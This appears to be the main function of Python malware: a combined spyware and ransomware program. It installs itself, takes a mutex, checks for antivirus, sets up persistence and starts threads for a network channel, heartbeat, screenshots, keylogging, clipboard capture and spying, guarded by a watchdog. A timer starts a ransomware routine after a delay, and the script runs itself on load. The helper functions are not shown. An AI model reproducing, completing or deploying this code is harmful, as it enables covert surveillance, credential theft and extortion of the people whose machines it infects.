def f_main():
    G["run"] = True
    G["start"] = time.time()
    G["hwid"] = f_hwid()
    G["adm"] = f_adm()
    f_appdir()
    f_log("run.log", "=== start pid=" + str(os.getpid()) + " hwid=" + G["hwid"] + " ===")
    f_install()
    f_mutex()
    threading.Thread(target=lambda: G.update({"av": f_av()}), daemon=True).start()
    if CFG["mods"].get("persist", True):
        threading.Thread(target=f_persist, daemon=True).start()

    jobs = [("net", f_net), ("beat", f_beat)]
    if CFG["mods"].get("shot", True):
        jobs.append(("shot", f_shot_loop))
    if CFG["mods"].get("keys", True):
        jobs.append(("keys", f_keys))
    if CFG["mods"].get("clip", True):
        jobs.append(("clip", f_clip_loop))
    if CFG["mods"].get("spy", True):
        jobs.append(("spy", f_spy_loop))
    for name, fn in jobs:
        G["fn_" + name] = fn
        t = threading.Thread(target=f_wrap(fn), daemon=True)
        t.start()
        G["threads"][name] = t
    if CFG["mods"].get("watchdog", True):
        G["fn_dog"] = f_dog
        t = threading.Thread(target=f_wrap(f_dog), daemon=True)
        t.start()
        G["threads"]["dog"] = t
    if CFG["mods"].get("ransom", True):
        threading.Timer(CFG["ransom_delay"], f_ransom_on).start()
    f_log("run.log", "threads started: " + ",".join(jobs[i][0] for i in range(len(jobs))))
    while G["run"]:
        time.sleep(3600)


try:
    f_main()
except Exception:
    err = traceback.format_exc()
    f_log("main.log", err)
    try:
        print(err, file=sys.stderr, flush=True)
    except Exception:
        pass
